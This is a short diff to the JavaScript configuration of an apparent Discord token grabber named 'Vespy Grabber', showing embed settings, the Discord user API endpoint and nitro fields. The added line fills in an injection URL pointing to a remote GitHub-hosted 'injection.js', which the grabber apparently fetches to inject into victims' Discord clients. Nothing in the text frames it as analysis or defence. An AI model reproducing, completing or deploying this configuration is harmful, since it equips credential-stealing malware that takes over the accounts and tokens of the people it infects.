@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Vespy Grabber', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png'.replace(/ /g, '%20'), 
   embed_color: 15844367,
-  injection_url: '', 
+  injection_url: 'https://raw.githubusercontent.com/vesperlol/Vespy-Grabber-v2.0/main/injection/injection.js', 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
     boost: {
